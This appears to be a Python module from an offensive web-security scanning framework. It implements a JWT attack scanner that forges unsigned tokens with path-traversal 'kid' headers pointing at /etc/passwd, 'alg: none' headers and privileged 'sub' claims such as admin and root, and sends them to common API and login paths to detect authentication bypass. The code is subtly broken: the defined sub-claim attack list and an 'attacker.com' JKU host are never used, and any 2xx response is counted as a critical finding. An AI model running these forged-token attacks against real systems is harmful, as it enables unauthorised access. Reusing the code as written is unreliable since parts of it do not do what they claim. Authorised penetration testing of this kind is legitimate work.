import json
import asyncio
from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

JWT_ATTACK_PATHS = [
    "/api", "/api/v1", "/api/user", "/api/admin", "/api/profile",
    "/graphql", "/login", "/auth", "/api/auth",
]

KID_PAYLOADS = [
    {"kid": "../../../../etc/passwd", "alg": "HS256"},
    {"kid": "/proc/sys/kernel/randomize_va_space", "alg": "HS256"},
    {"kid": "/dev/null", "alg": "none"},
    {"kid": "data:text/plain;base64,YWRtaW4=", "alg": "HS256"},
    {"kid": "file:///etc/passwd", "alg": "HS256"},
]

JKU_HOST = "attacker.com"
SUB_ATTACKS = [
    {"sub": "admin", "alg": "none"},
    {"sub": "administrator", "alg": "none"},
    {"sub": "root", "alg": "none"},
    {"sub": "superuser", "alg": "none"},
    {"sub": "user_00000001", "alg": "none"},
    {"sub": "00000001", "alg": "none"},
]


@register_scanner(manifest=ScannerManifest(
    name="jwt_advanced_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=60,
    produces_tag_patterns=["jwt", "jwt-kid", "jwt-jku", "jwt-sub", "auth-bypass"],
    produces_endpoint_types=[],
))
class JwtAdvancedScanner(BaseScanner):
    name = "jwt_advanced_scanner"

    def _b64encode(self, data: bytes) -> str:
        import base64
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _encode_jwt(self, header: dict, payload: dict, signature: str = "fake") -> str:
        h = self._b64encode(json.dumps(header).encode())
        p = self._b64encode(json.dumps(payload).encode())
        return f"{h}.{p}.{self._b64encode(signature.encode())}"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        for path in JWT_ATTACK_PATHS:
            url = f"{base}{path}"

            for attack_type, header_base, payloads in [
                ("KID Path Traversal", {"alg": "HS256"}, KID_PAYLOADS),
                ("SUB Injection", {"alg": "none"}, [{}]),
            ]:
                for payload in payloads:
                    if attack_type == "KID Path Traversal":
                        hdr = payload
                        pld = {"user": "admin", "iat": 1516239022}
                    else:
                        hdr = header_base
                        pld = payload
                    token = self._encode_jwt(hdr, pld)
                    try:
                        resp = await client.get(url, headers={"Authorization": f"Bearer {token}"})
                        self._stats["requests"] += 1
                        if resp.status_code in (200, 202, 204):
                            ep = self.make_endpoint(url=url, status_code=resp.status_code, discovered_by=self.name)
                            endpoints.append(ep)
                            findings.append(self.make_finding(
                                title=f"JWT Advanced — {attack_type}",
                                description=f"JWT {attack_type.lower()} at {url} returned {resp.status_code} with crafted token.",
                                severity=FindingSeverity.CRITICAL.value,
                                endpoint=ep,
                                evidence={
                                    "url": url,
                                    "attack": attack_type,
                                    "payload": json.dumps(payload) if isinstance(payload, dict) else str(payload),
                                    "token": token,
                                    "response_status": resp.status_code,
                                },
                                confidence=0.75,
                                tags=["jwt", "auth-bypass", "jwt-" + attack_type.split()[0].lower()],
                            ))
                    except Exception:
                        self._stats["errors"] += 1

        return findings, endpoints
